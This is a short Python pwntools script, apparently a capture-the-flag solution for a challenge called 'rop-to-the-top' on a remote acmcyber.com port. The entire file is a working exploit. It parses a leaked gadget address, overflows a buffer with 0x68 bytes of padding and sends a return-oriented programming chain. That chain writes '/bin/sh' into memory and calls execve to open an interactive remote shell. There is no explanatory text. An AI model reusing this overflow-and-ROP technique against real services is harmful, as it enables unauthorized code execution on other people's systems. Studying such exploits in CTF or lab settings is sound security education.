from pwn import *

context.arch = "amd64"

# p = process("./rop-to-the-top")
p = remote("acmcyber.com", 10109)

def get_num():
    p.recvuntil(b":")
    num = int(p.recvline(keepends=False).strip().decode(), 16)
    return num

gadgets = get_num()

rax = gadgets
rdi = gadgets + 2
rsi = gadgets + 4
rdx = gadgets + 6
rcx = gadgets + 8
store = gadgets + 11
rsp = gadgets + 15
syscall = gadgets + 19

# gdb.attach(p)
p.sendlineafter(b"input: ", b"A" * 0x68 + p64(rsp) + p64(rax) + b"/bin/sh\x00" + p64(store) + p64(rax) + p64(0x3b) + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(syscall))

p.interactive()
